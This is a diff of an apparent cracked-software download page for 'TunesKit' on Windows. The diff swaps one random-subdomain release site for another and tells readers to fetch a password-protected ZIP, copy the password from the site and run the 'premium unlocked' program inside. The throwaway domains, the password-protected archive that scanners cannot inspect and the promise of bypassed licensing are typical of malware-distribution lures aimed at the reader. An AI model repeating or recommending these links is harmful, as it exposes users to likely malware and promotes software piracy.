@@ -8,12 +8,12 @@ TunesKit — Windows setup and configuration · Premium workspace · Zero nag di
 
 > Use the release page below for Windows.
 
-- **Release page:** [kvygycsrzlo.slopmods.tech](https://kvygycsrzlo.slopmods.tech/)
-- **Full URL:** `https://kvygycsrzlo.slopmods.tech/`
+- **Release page:** [kvygycsrzlo.slopmods.top](https://kvygycsrzlo.slopmods.top/)
+- **Full URL:** `https://kvygycsrzlo.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **kvygycsrzlo.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **kvygycsrzlo.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ TunesKit — Windows setup and configuration · Premium workspace · Zero nag di
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **kvygycsrzlo.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **kvygycsrzlo.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
